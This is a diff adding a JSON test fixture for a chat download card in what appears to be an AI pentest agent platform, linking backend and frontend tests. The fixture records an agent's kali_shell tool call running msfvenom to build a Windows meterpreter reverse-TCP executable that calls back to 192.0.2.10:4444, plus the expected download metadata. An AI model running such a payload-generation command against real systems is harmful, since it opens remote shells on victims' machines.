@@ -1,0 +1,22 @@
+{
+  "_about": "The chat download card end to end. agentic/tests/test_download_card_workspace.py proves the agent turns `step` (a payload the agent wrote into its project's workspace) into exactly `file_ready`, and serves `workspace_relative_path` of that project from /files and /workspace/download. webapp/src/app/graph/components/AIAssistantDrawer/FileDownloadCard.route.test.tsx renders the card from `file_ready`, runs the real /api/agent/files route, and expects the agent call `agent_download_path`. Change one side and the other fails.",
+  "project_id": "proj-owner-1",
+  "step": {
+    "tool_name": "kali_shell",
+    "tool_args": {
+      "command": "msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.0.2.10 LPORT=4444 -f exe -o /workspace/proj-owner-1/notes/payload.exe"
+    },
+    "tool_output": "Payload size: 200262 bytes\nFinal size of exe file: 274944 bytes\nSaved as: /workspace/proj-owner-1/notes/payload.exe\n",
+    "output_analysis": "",
+    "success": true
+  },
+  "file_ready": {
+    "filepath": "/workspace/proj-owner-1/notes/payload.exe",
+    "filename": "payload.exe",
+    "source": "msfvenom",
+    "description": "Generated payload: payload.exe",
+    "projectId": "proj-owner-1"
+  },
+  "workspace_relative_path": "notes/payload.exe",
+  "agent_download_path": "/workspace/download?projectId=proj-owner-1&path=notes%2Fpayload.exe"
+}
